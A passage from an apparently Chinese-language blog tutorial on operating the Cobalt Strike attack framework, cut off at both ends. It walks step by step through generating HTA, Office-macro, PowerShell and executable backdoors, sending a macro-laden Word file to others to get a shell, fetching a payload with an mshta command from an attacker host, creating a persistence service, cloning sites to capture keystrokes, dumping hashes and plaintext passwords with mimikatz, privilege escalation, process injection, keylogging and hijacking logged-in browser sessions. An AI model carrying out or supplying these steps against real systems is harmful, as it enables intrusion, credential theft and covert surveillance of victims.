alt="img"></p><p>我们也可以打开windows下的cobaltstrike客户端，然后把ip设置为我们的启动时候的ip即可。</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078005570-ea2b0976-ba70-45a3-8b60-ef545c067905-20220401150227423.png" alt="img"></p><h1 id="清除缓存"><a href="#清除缓存" class="headerlink" title="清除缓存"></a>清除缓存</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python">rm <span class="token operator">-</span>rf <span class="token punctuation">.</span>cobaltstrike<span class="token punctuation">.</span>beacon_keys <span class="token operator">&amp;</span><span class="token operator">&amp;</span> rm <span class="token operator">-</span>rf nohup<span class="token punctuation">.</span>out <span class="token operator">&amp;</span><span class="token operator">&amp;</span> rm <span class="token operator">-</span>rf data<span class="token operator">/</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> rm <span class="token operator">-</span>rf logs<span class="token operator">/</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> rm <span class="token operator">-</span>rf uploads <span class="token operator">&amp;</span><span class="token operator">&amp;</span> rm <span class="token operator">-</span>rf downloads<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="CobaltStrike的使用"><a href="#CobaltStrike的使用" class="headerlink" title="CobaltStrike的使用"></a>CobaltStrike的使用</h1><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078006653-628ca2ce-e97d-4cb8-b423-395af8c851eb-20220401150223965.png" alt="img"></p><h2 id="CobaltStrike模块"><a href="#CobaltStrike模块" class="headerlink" title="CobaltStrike模块"></a>CobaltStrike模块</h2><ul><li>New Connection：打开一个新连接窗口</li><li>Preferences：偏好设置，就是设置CobaltStrike外观的</li><li>Visualization：将主机以不同的权限展示出来(主要以输出结果的形式展示)</li><li>VPN Interfaces：设置VPN接口</li><li>Listeners：创建监听器</li><li>Script Interfaces：查看和加载CNA脚本</li><li>Close：关闭</li></ul><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078006563-0090a00d-4d70-4cdf-a61b-2824e077dfc4-20220401150223746.png" alt="img"></p><h2 id="创建监听器Listener"><a href="#创建监听器Listener" class="headerlink" title="创建监听器Listener"></a><strong>创建监听器Listener</strong></h2><p>CobaltStrike的内置监听器为Beacon，外置监听器为Foreign。CobaltStrike的Beacon支持异步通信和交互式通信。</p><p>点击左上方CobaltStrike选项——&gt;在下拉框中选择 Listeners ——&gt;在下方弹出区域中单机add</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">name：为监听器名字，可任意payload：payload类型HTTP Hosts<span class="token punctuation">:</span> shell反弹的主机，也就是我们kali的ipHTTP Hosts<span class="token punctuation">(</span>Stager<span class="token punctuation">)</span><span class="token punctuation">:</span> Stager的马请求下载payload的地址HTTP Port<span class="token punctuation">(</span>C2<span class="token punctuation">)</span><span class="token punctuation">:</span> C2监听的端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078006702-e51812f2-b6e6-45be-ad4f-79398843130f-20220401150223885.png" alt="img"></p><p>CobaltStrike4.0目前有以下8种Payload选项，如下：</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078006770-55c859b5-0f00-4f08-8542-621ea2d41fdc-20220401150223967.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078006962-0ededb46-1c2b-4a4a-b94b-bdebbb2129f2-20220401150224051.png" alt="img"></p><p><strong>内部的Listener</strong></p><ul><li>windows&#x2F;beacon_dns&#x2F;reverse_dns_txt</li><li>windows&#x2F;beacon_http&#x2F;reverse_http</li><li>windows&#x2F;beacon_https&#x2F;reverse_https </li><li>windows&#x2F;beacon_bind_tcp</li><li>windows&#x2F;beacon_bind_pipe</li></ul><p><strong>外部的Listener</strong></p><ul><li>windows&#x2F;foreign&#x2F;reverse_http</li><li>windows&#x2F;foreign&#x2F;reverse_https</li></ul><p><strong>External</strong></p><ul><li>windows&#x2F;beacon_extc2</li></ul><p>Beacon为内置的Listener，即在目标主机执行相应的payload，获取shell到CS上；其中包含DNS、HTTP、HTTPS、SMB。Beacon可以选择通过DNS还是HTTP协议出口网络，你甚至可以在使用Beacon通讯过程中切换HTTP和DNS。其支持多主机连接，部署好Beacon后提交一个要连回的域名或主机的列表，Beacon将通过这些主机轮询。目标网络的防护团队必须拦截所有的列表中的主机才可中断和其网络的通讯。通过种种方式获取shell以后（比如直接运行生成的exe），就可以使用Beacon了。</p><p>Foreign为外部结合的Listener，常用于MSF的结合，例如获取meterpreter到MSF上。</p><p>关于DNS Beacon的使用：<a href="https://xie1997.blog.csdn.net/article/details/106423900">CobaltStrike中DNS Beacon的使用</a></p><h2 id="创建攻击Attacks-生成后门"><a href="#创建攻击Attacks-生成后门" class="headerlink" title="创建攻击Attacks(生成后门)"></a><strong>创建攻击Attacks(生成后门)</strong></h2><p><strong>点击中间的攻击——&gt;生成后门</strong></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078007270-b888a6ca-5033-4b07-b8a4-434031bd1b5e-20220401150224076.png" alt="img"></p><p>这里Attacks有几种，如下：</p><ul><li>HTML Application 生成一个恶意HTML Application木马，后缀格式为 .hta。通过HTML调用其他语言的应用组件进行攻击，提供了 可执行文件、PowerShell、VBA三种方法。</li><li>MS Office Macro 生成office宏病毒文件；</li><li>Payload Generator 生成各种语言版本的payload，可以生成基于C、C#、COM Scriptlet、Java、Perl、PowerShell、Python、Ruby、VBA等的payload</li><li>Windows Executable 生成32位或64位的exe和基于服务的exe、DLL等后门程序</li><li>Windows Executable(S) 用于生成一个exe可执行文件，其中包含Beacon的完整payload，不需要阶段性的请求。与Windows Executable模块相比，该模块额外提供了代理设置，以便在较为苛刻的环境中进行渗透测试。该模块还支持powershell脚本，可用于将Stageless Payload注入内存</li></ul><h3 id="HTML-Application"><a href="#HTML-Application" class="headerlink" title="HTML Application"></a>HTML Application</h3><p>HTML Application用于生成hta类型的文件。HTA是HTML Application的缩写（HTML应用程序），是软件开发的新概念，直接将HTML保存成HTA的格式，就是一个独立的应用软件，与VB、C++等程序语言所设计的软件界面没什么差别。HTML Application有三种类型的生成方式，测试发现，只有powershell方式生成的hta文件才能正常执行上线，Executable和VBA方式生成的hta文件执行的时候提示当前页面的脚本发生错误。</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078007675-e0d91d49-6eaa-4149-a963-a057ba60ed45-20220401150224125.png" alt="img"></p><p>基于PowerShell方式生成的hta文件，执行上线</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078007763-d1eb64a7-a482-4d86-ba1a-3b067e8e7ec0-20220401150224157.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078007776-54203014-3b07-4129-90e2-a67ee3604957-20220401150224229.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078007993-0e1acfc7-a687-424b-a368-5e7fc166bc2a-20220401150224247.png" alt="img"></p><p>执行mshta上线成功</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">mshta http<span class="token punctuation">:</span><span class="token operator">//</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>xx<span class="token operator">/</span>download<span class="token operator">/</span><span class="token builtin">file</span><span class="token punctuation">.</span>ext<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078008485-0c59e4d2-5637-4c35-a1ad-ed09ba7a73ab-20220401150224443.png" alt="img"></p><p>基于Executable方式生成的hta文件，执行报错如下</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078008444-88084206-fa43-40d5-b716-d7ff95736caf-20220401150224359.png" alt="img"></p><p>基于VBA方式生成的hta文件，执行报错如下</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078008489-a2f5412b-1d03-42e6-96a4-dbdfbdbb1661-20220401150224407.png" alt="img"></p><h3 id="MS-Office-Macro"><a href="#MS-Office-Macro" class="headerlink" title="MS Office Macro"></a>MS Office Macro</h3><p>攻击——&gt;生成后门——&gt;MS Office Macro</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078008676-badc7e5d-e33b-4cf6-8d8e-5263cf6256c5-20220401150224449.png" alt="img"><br>然后选择一个监听器，点击Generate</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078008877-b2f761b7-0559-42df-805b-a52a932590b7-20220401150224472.png" alt="img"></p><p>然后点击Copy Macro</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078009417-649a0dcc-5eb8-4889-9d36-8d9d8930595d-20220401150224573.png" alt="img"></p><p>然后打开word编辑器，点击视图，然后点击宏</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078009911-84bf2599-7fb5-4590-abb3-c600e2073111-20220401150224606.png" alt="img"></p><p>随便输入一个宏名，点击创建</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078009922-eaf40eb4-c94b-4578-9bb1-1f755a29bc2d-20220401150224614.png" alt="img"></p><p>先清除这里面的所有代码，然后复制CobaltStrike生成的代码，保存退出。</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078010023-7d6ef4e5-f36c-4a0a-9f7b-00b2e720c817-20220401150224888.png" alt="img"></p><p>将该文档发给其他人，只要他是用word打开，并且开启了宏，我们的CS就会收到弹回来的shell，进程名是rundll32.exe。</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078010008-4671fd05-1da7-4179-a57a-7ffe8c606f77-20220401150224751.png" alt="img"></p><p>word开启禁用宏：文件——&gt;选项——&gt;信任中心——&gt;信任中心设置</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078010674-cb03004d-5ed1-439d-8fd5-5d8237a5d266-20220401150224943.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078010855-4fd1c43d-1078-42c6-9fea-49e98833cedb-20220401150224767.png" alt="img"></p><h3 id="Payload-Generator"><a href="#Payload-Generator" class="headerlink" title="Payload Generator"></a>Payload Generator</h3><p>这个模块用于生成各种语言版本的shellcode，然后用其他语言进行编译生成，可参考：<a href="https://xie1997.blog.csdn.net/article/details/106348527">MSF木马的免杀(三)</a></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078010970-2974a413-6e52-45eb-958e-051bca647807-20220401150224906.png" alt="img"></p><p>这里主要讲两个payload：Powershell 和 PowerShell Command 。这两个都是利用powershell进行上线。</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078011032-832d0f17-a3a4-4ad4-bb66-03083a3a77a1-20220401150225059.png" alt="img"></p><p><strong>PowerShell</strong></p><p>选择该payload会生成一个payload.ps1文件，可以选择如下方式上线</p><p>powershell下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Import<span class="token operator">-</span>Module <span class="token punctuation">.</span>\payload<span class="token punctuation">.</span>ps1 或 <span class="token punctuation">.</span>\payload<span class="token punctuation">.</span>ps1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078012267-ab43c2a5-8dc0-4f81-b132-147c2e312a7a-20220401150225392.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078012275-b39ca0af-3e8f-444c-93ca-b0b4b727a048-20220401150225319.png" alt="img"></p><p>cmd下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">powershell Import<span class="token operator">-</span>Module <span class="token punctuation">.</span>\payload<span class="token punctuation">.</span>ps1 或 powershell <span class="token punctuation">.</span>\payload<span class="token punctuation">.</span>ps1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078012317-d78e6ce0-f474-4983-a5bc-99e389d17295-20220401150225577.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078012428-231f9384-e175-43ad-8783-f31e775e5ded-20220401150225725.png" alt="img"></p><p><strong>PowerShell Command</strong></p><p>选择该payload会生成一个payload.txt文件，可以选择如下方式上线：</p><p>直接复制该文件内容在cmd下运行即可上线</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078017033-52264ca0-39a5-4b96-b05f-fbf965f799ce-20220401150234472.png" alt="img"></p><p>或者也可只保留该文件的base64字段，然后执行如下命令上线</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078014056-358ad4da-f046-4edd-91e2-8cff88b258e9-20220401150227181.png" alt="img"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">如果是执行当前路径powershell<span class="token punctuation">;</span>$a<span class="token operator">=</span>Get<span class="token operator">-</span>Content payload<span class="token punctuation">.</span>txt<span class="token punctuation">;</span>powershell <span class="token operator">-</span>enc $a如果是执行指定路径powershell<span class="token punctuation">;</span>$a<span class="token operator">=</span>Get<span class="token operator">-</span>Content <span class="token operator">-</span>Path <span class="token string">"E:\payload.txt"</span><span class="token punctuation">;</span>powershell <span class="token operator">-</span>enc $a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078013367-5c130db8-5de0-41aa-b640-3816b78fd319-20220401150226330.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078013732-c1ff1a8a-0c61-4f3f-a5b4-1299c1fd3280-20220401150226841.png" alt="img"></p><h3 id="Windows-Executable-amp-Windows-Executable-S"><a href="#Windows-Executable-amp-Windows-Executable-S" class="headerlink" title="Windows Executable &amp; Windows Executable(S)"></a>Windows Executable &amp; Windows Executable(S)</h3><p>这两个模块直接用于生成可执行的 exe 文件或 dll 文件。Windows Executable是生成Stager类型的马，而Windows Executable(S) 是生成Stageless类型的马。那Stager和Stageless有啥区别呢？</p><ul><li>Stager是分阶段传送Payload。分阶段啥意思呢？就是我们生成的Stager马其实是一个小程序，用于从服务器端下载我们真正的shellcode。分阶段在很多时候是很有必要的，因为很多场景对于能加载进内存并成功漏洞利用后执行的数据大小存在严格限制。所以这种时候，我们就不得不利用分阶段传送了。如果不需要分阶段的话，可以在C2的扩展文件里面把 host_stage 选项设置为 false。</li><li>而Stageless是完整的木马，后续不需要再向服务器端请求shellcode。所以使用这种方法生成的木马会比Stager生成的木马体积要大。但是这种木马有助于避免反溯源，因为如果开启了分阶段传送，任何人都能连接到你的C2服务器请求payload，并分析payload中的配置信息。在CobaltStrike4.0及以后的版本中，后渗透和横向移动绝大部分是使用的Stageless类型的木马。</li></ul><p>Windowss Executable(S)相比于Windows Executable，其中包含Beacon的完整payload，不需要阶段性的请求，该模块额外提供了代理设置，以便在较为苛刻的环境中进行渗透测试。该模块还支持powershell脚本，可用于将Stageless Payload注入内存。</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078013633-07ed894b-6ea0-4710-a83d-d195d04955cf-20220401150226981.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078014224-d0c17a5e-e17b-4f8e-b838-66ffffe7ac56-20220401150227128.png" alt="img"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#注意，等号（=）后面要有空格</span>sc create autoRunBackDoor binPath<span class="token operator">=</span> <span class="token string">"cmd.exe /c C:\users\administrator\desktop\cs.exe"</span> start<span class="token operator">=</span> auto DisplayName<span class="token operator">=</span> autoRunBackDoor<span class="token comment">#开启某个系统服务</span>sc start autoRunBackDoor <span class="token comment">#停止某个系统服务</span>sc stop autoRunBackDoor <span class="token comment"># 删除某个系统服务</span>sc delete service_name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078014518-cbed7fd5-f0c7-4801-8f29-50339a64d599-20220401150227174.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078014739-91f050ce-2932-4dff-bd49-9839f9cc6834-20220401150227402.png" alt="img"></p><h2 id="创建攻击Attacks-钓鱼攻击"><a href="#创建攻击Attacks-钓鱼攻击" class="headerlink" title="创建攻击Attacks(钓鱼攻击)"></a><strong>创建攻击Attacks(钓鱼攻击)</strong></h2><p>点击中间的Attacks——&gt;Web Drive-by（网站钓鱼攻击）</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078015012-facaced0-8144-4775-bd0b-e08451c0582b-20220401150227304.png" alt="img"></p><ul><li>web服务管理 对开启的web服务进行管理；</li><li>克隆网站 克隆网站，可以记录受害者提交的数据；</li><li>文件下载 提供一个本地文件下载，可以修改Mime信息。可以配合DNS欺骗实现挂马效果使用</li><li>Scripted Web Delivery(S) 基于Web的攻击测试脚本，自动生成可执行的payload ，通常用这个模块来生成powershell命令反弹shell</li><li>签名Applet攻击 启动一个Web服务以提供自签名Java Applet的运行环境;</li><li>智能攻击 自动检测Java版本并利用已知的exploits绕过security；</li><li>信息搜集 用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等。</li></ul><h3 id="克隆网站"><a href="#克隆网站" class="headerlink" title="克隆网站"></a>克隆网站</h3><p>该模块用来克隆一个网站，来获取用户的键盘记录</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078015336-09801090-262d-4392-b8bd-d3883b8734a4-20220401150227422.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078015436-83e781b8-04a7-4ffa-bab7-990b86bddebb-20220401150227503.png" alt="img"></p><p>然后访问URL</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078016762-80c38c3b-8be0-4832-ae11-7667d13052a6-20220401150229669.png" alt="img"></p><p>cs的web日志可以查看到目标访问的键盘记录</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078016158-6faa5366-ccb1-43f3-b4dc-a72ef7448830-20220401150228430.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078016189-88634cbb-16e1-4bd5-b506-e13444a40ba7-20220401150227670.png" alt="img"></p><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>该模块用来获取用户的系统信息、浏览器信息。</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078016421-2d811b15-ea9d-40a5-b16a-ac96837830c4-20220401150227788.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078017229-676df37e-3dbe-4798-81de-35b580c2c051-20220401150227887.png" alt="img"></p><p>然后只要目标访问我们的这个链接，就会自动跳转到百度，并且我们的cs可以获取到目标系统和浏览器的信息</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078017234-1af069c9-ff4a-4036-85ec-8f4e789973ca-20220401150227977.png" alt="img"></p><h2 id="视图View"><a href="#视图View" class="headerlink" title="视图View"></a><strong>视图View</strong></h2><p>点击中间的View</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078017524-7eb35625-8733-42b6-8bc1-45883f75fe73-20220401150228076.png" alt="img"></p><ul><li>Applications 显示受害者机器的应用信息；</li><li>Credentials 显示受害者机器的凭证信息，通过hashdump和mimikatz获取的密码都保存在这里；</li><li>Downloads 查看从被控机器上下载的文件；</li><li>Event Log 可以看到事件日志，清楚的看到系统的事件,并且团队可以在这里聊天;</li><li>Keystrokes 查看键盘记录；</li><li>Proxy Pivots 查看代理信息；</li><li>Screenshots 查看屏幕截图；</li><li>Script Console 在这里可以加载各种脚本以增强功能，脚本地址：<a href="https://github.com/rsmudge/cortana-scripts">https://github.com/rsmudge/cortana-scripts</a></li><li>Targets 查看目标；</li><li>Web Log 查看web日志。</li></ul><h2 id="对被控主机的操作"><a href="#对被控主机的操作" class="headerlink" title="对被控主机的操作"></a>对被控主机的操作</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">Interact       打开beaconAccess dump hashes   获取<span class="token builtin">hash</span>Elevate       提权Golden Ticket 生成黄金票据注入当前会话MAke token    凭证转换Run Mimikatz  运行 Mimikatz Spawn As      用其他用户生成Cobalt Strike的beaconExploreBrowser Pivot 劫持目标浏览器进程Desktop<span class="token punctuation">(</span>VNC<span class="token punctuation">)</span>  桌面交互File Browser  文件浏览器Net View      命令Net ViewPort scan     端口扫描Process <span class="token builtin">list</span>  进程列表Screenshot    截图PivotingSOCKS Server 代理服务Listener     反向端口转发Deploy VPN   部署VPNSpawn            新的通讯模式并生成会话Session          会话管理，删除，心跳时间，退出，备注<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="抓取hash和dump明文密码"><a href="#抓取hash和dump明文密码" class="headerlink" title="抓取hash和dump明文密码"></a>抓取hash和dump明文密码</h3><p>这两项功能都需要管理员权限，如果权限不足，先提权</p><ul><li>抓取密码哈希：右键被控主机——&gt;Access——&gt;Dump Hashes</li><li>利用mimikatz抓取明文密码：右键被控主机——&gt;Access——&gt;Run Mimikatz</li></ul><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078017961-fcd038ae-4519-452f-8d8e-da738ae01eb4-20220401150228139.png" alt="img"></p><p>抓取密码哈希，也可以直接输入：<strong>hashdump</strong></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078018004-e6e89cf8-bd5d-4832-99b7-84b94f5f4ec7-20220401150228198.png" alt="img"></p><p>使用mimikatz抓取明文密码，也可以直接输入：<strong>logonpasswords</strong></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078018170-36113581-d912-493c-998f-1a3f1022e2ab-20220401150228289.png" alt="img"></p><p>抓取完之后，点击凭证信息，就会显示我们抓取过的哈希或者明文。这里我们也可以手动添加或修改凭证信息</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078018486-52a41480-a72b-40f4-af18-28e132a7816e-20220401150228593.png" alt="img"></p><h3 id="提权-Elevate"><a href="#提权-Elevate" class="headerlink" title="提权(Elevate)"></a>提权(Elevate)</h3><p>当获取的当前权限不够时，可以使用提权功能</p><p>右键被控主机——&gt;Access——&gt;Elevate</p><p>亲测Windows Server 2008R2 、Win7 及以下系统可用。Win10不可用 </p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078018499-0e002afd-db97-4aef-ba2a-83ce4c5df00a-20220401150229313.png" alt="img"></p><p>默认有三个提权payload可以使用，分别是MS14-058、uac-dll、uac-token-duplication 。</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078018793-90705f7b-9ab8-4c4b-9aa5-435247cdc125-20220401150228669.png" alt="img"></p><p>我们选中MS14-058，点击Launch</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078019195-1c3d13a7-665d-4437-9935-83ab391bb5bf-20220401150228740.png" alt="img"></p><p>之后就弹回来一个system权限的beacon</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078019401-535db2d3-9adb-4868-9fa8-f5853d90dab9-20220401150229012.png" alt="img"></p><p>我们也可以自己加入一些提权脚本进去。在Github上有一个提权工具包，使用这个提权工具包可以增加几种提权方法：<a href="https://github.com/rsmudge/ElevateKit">GitHub - rsmudge&#x2F;ElevateKit: The Elevate Kit demonstrates how to use third-party privilege escalation attacks with Cobalt Strike’s Beacon payload.</a> 。我们下载好该提权工具包后</p><p>如下，</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078019468-8e78c279-f1d2-49b1-91ab-579dd1bc29dd-20220401150229126.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078019757-0353a4e8-b766-4c85-904b-57f30cefb8dd-20220401150229343.png" alt="img"></p><p>再打开我们的提权，可以看到多了几种提权方式了</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078019734-407c6df9-9ff8-4cc1-a6aa-2b44ab8fd678-20220401150230276.png" alt="img"></p><h3 id="利用被控主机建立Socks4代理"><a href="#利用被控主机建立Socks4代理" class="headerlink" title="利用被控主机建立Socks4代理"></a>利用被控主机建立Socks4代理</h3><p>当我们控制的主机是一台位于公网和内网边界的服务器 ，我们想利用该主机继续对内网进行渗透，于是，我们可以利用CS建立socks4A代理</p><p>右键被控主机——&gt;Pivoting——&gt;SOCKS Server</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078020019-a85e6bb0-437a-4dc5-9138-0782b1c94978-20220401150229400.png" alt="img"></p><p>这里是SOCKS代理运行的端口，任意输入一个未占用的端口即可，默认CS会给出一个，我们直接点击Launch即可。</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078020408-ae055b97-70fd-46d9-bff7-0e9d75e20cd6-20220401150229457.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078020504-efd40533-57e1-49b1-8e96-8f96dcec5f16-20220401150229501.png" alt="img"></p><p>于是，我们在自己的主机上设置Socks4代理。代理ip是我们CS服务端的ip，端口即是 38588。</p><p>如果我们想查看整个CS代理的设置，可以点击View——&gt;Proxy Pivots </p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078020512-cbf61170-0f4d-4121-93fc-9d546bcd70d6-20220401150229564.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078020876-ebcd721c-08b4-420f-9002-9fd210b04b7b-20220401150229606.png" alt="img"></p><p>然后我们可以直接在浏览器设置socks4代理</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078021065-83ee4dfc-f0db-4976-a90f-fb6bac7e2b5d-20220401150229742.png" alt="img"></p><p>或者可以点击Tunnel，然后会给我们一个MSF的代理：setg Proxies socks4:xx.xx.xx.xx:38588</p><h3 id="进程列表-注入进程，键盘监控"><a href="#进程列表-注入进程，键盘监控" class="headerlink" title="进程列表(注入进程，键盘监控)"></a>进程列表(注入进程，键盘监控)</h3><p>右键被控主机——&gt;Explore——&gt;Process List</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078021112-b5cae9b8-079c-401b-b487-a7943d06ec52-20220401150229743.png" alt="img"></p><p>即可列出进程列表</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078021358-c01206ad-3bc5-4e15-9b07-347d3886a6d0-20220401150230142.png" alt="img"></p><p>选中该进程，Kill为杀死该进程，Refresh为刷新该进程，Inject 则是把beacon注入进程，Log Keystrokes为键盘记录，Screenshot 为截图，Stea Token为窃取运行指定程序的用户令牌</p><p>这里着重讲一下注入进程和键盘记录</p><p><strong>Inject注入进程</strong></p><p>选择进程，点击Inject，随后选择监听器，点击choose，即可发现CobaltStrike弹回了目标机的一个新会话，这个会话就是成功注入到某进程的beacon会话。该功能可以把你的beacon会话注入到另外一个程序之中，注入之后，除非那个正常进程被杀死了，否则我们就一直可以控制该主机了。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">inject  进程PID  进程位数  监听<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078021337-a77b3227-6451-44ad-acb5-7370d659a6c3-20220401150229937.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078021624-d77c9310-278b-4d89-95da-151d19ca9f50-20220401150230069.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078022279-ac45f4dc-421f-4b30-a5df-53a776b69f4e-20220401150230616.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078022419-088e5e60-bf2b-4b64-a9e6-b7702387eebd-20220401150230247.png" alt="img"></p><p><strong>键盘记录</strong></p><p>任意选择一个进程，点击<strong>Log Keystrokes</strong>，即可监听该主机的键盘记录</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">keylogger  进程PID  进程位数<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078022884-73a8721b-ee67-406b-a034-6edf69861402-20220401150230266.png" alt="img"></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078022881-ac3a973e-0744-4ab2-9928-13bfcf73ad42-20220401150230314.png" alt="img"></p><p>查看键盘记录结果：点击钥匙一样的按钮，就可以在底下看到键盘记录的详细了，会监听所有的键盘记录，而不只是选中的进程的键盘记录</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078023054-282f896b-6f65-4196-b014-bf6087e02bf4-20220401150230506.png" alt="img"></p><p>键盘监听记录，也可以直接输入 <strong>keylogger</strong></p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078023340-9c3a6010-25bd-4f06-8830-d26c6646a40c-20220401150231268.png" alt="img"></p><h3 id="浏览器代理Browser-Pivot"><a href="#浏览器代理Browser-Pivot" class="headerlink" title="浏览器代理Browser Pivot"></a>浏览器代理Browser Pivot</h3><p>使用浏览器代理功能，我们可以注入到目标机器的浏览器进程中。然后在本地浏览器中设置该代理，这样，我们可以在本地浏览器上访问目标机器浏览器已经登录的网站，而不需要登录。但是目前浏览器代理只支持IE浏览器。如下，目标主机的IE浏览器目前在访问fofa，并且已登录。现在我们想利用浏览器代理在本地利用目标主机身份进行访问。</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078023624-4aad5c84-e81d-4197-8052-de86e843e080-20220401150230698.png" alt="img"></p><p>选中目标，邮件浏览器代理，然后选中IE浏览器的进程</p><p><img src="/2019/12/19/cobaltstrike-de-shi-yong/1635078023699-5b6b3f85-995c-4201-b457-b7b8beccf9fd-20220401150230568.png" alt="img"></p><p>这里看到IE浏览器有两个进程，分别是 